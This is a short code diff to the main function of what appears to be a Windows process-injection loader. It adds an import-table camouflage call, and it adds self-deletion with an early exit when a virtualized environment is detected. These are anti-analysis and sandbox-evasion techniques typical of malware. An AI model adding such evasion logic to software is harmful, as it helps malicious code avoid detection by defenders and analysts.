@@ -32,6 +32,7 @@ INT main() {
 	DWORD		dwProcessId = NULL;
 	HANDLE		hProcess = NULL;
 
+	IatCamouflage();
 
 	if (!InitializeSyscalls()) {
 #if DEBUG
@@ -44,6 +45,8 @@ INT main() {
 #if DEBUG
 		PRINTA("[!] Detected A Virtualized Environment \n");
 #endif
+		DeleteSelf();
+		return -1;
 	}
 	
 #ifdef TARGET_PROCESS
